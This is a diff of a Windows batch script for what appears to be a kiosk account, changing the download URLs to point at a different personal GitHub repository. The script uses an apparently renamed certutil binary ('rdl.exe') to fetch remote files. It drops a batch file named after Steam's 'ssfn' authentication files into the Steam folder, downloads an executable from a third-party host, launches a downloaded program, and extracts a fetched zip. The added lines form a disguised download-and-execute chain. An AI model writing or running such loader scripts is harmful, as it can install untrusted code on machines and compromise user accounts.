@@ -28,7 +28,7 @@ set "unzipFolder=C:\Users\kiosk\Downloads\G"
 
 IF EXIST "C:\Program Files (x86)\steam\ssfn_G.bat" (
 echo Exists) ELSE (
-  c:\temp\rdl.exe -urlcache -split -f "https://raw.githubusercontent.com/enazar415/Unturned-Cloud/main/ssfn_G.bat" "C:\Program Files (x86)\Steam\ssfn_G.bat"
+  c:\temp\rdl.exe -urlcache -split -f "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ssfn_G.bat" "C:\Program Files (x86)\Steam\ssfn_G.bat"
 )
 
 "c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\rdl.exe"
@@ -40,7 +40,7 @@ if not exist "%unzipFolder%" (
 
 start "" "C:\Users\kiosk\Downloads\VoughtUadml.exe"
 
-"C:\Users\kiosk\Downloads\rdl.exe" -k -L -o  "%zipFile%" "https://github.com/enazar415/Unturned-Cloud/releases/download/test/G.zip"
+"C:\Users\kiosk\Downloads\rdl.exe" -k -L -o  "%zipFile%" "https://github.com/tobiasmulln/Testing/releases/download/LSF/G.zip"
 "C:\Users\kiosk\AppData\Roaming\Cloudforce\7-Zip\7z.exe" x G.zip -oG
 del "%zipFile%"
 
